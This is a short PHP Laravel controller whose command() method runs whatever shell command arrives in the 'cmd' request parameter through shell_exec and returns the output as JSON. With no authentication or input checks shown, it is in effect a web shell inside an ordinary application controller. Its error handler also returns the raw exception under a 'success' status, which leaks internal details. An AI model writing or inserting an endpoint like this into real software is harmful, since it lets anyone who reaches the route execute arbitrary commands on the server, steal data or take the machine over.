<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class CommandController extends Controller
{
    //
    public function command(Request $request){
        try {
            //code...
        $strCommand= $request['cmd']??"php -v";
        $output=shell_exec($strCommand);
        return response()->json([
            "status"=>"success",
             "message"=>$output
        ],200);
        } catch (\Throwable $th) {
            //throw $th;
            return response()->json([
                "status"=>"success",
                 "message"=>$th
            ],200);
        }
       
    }
}
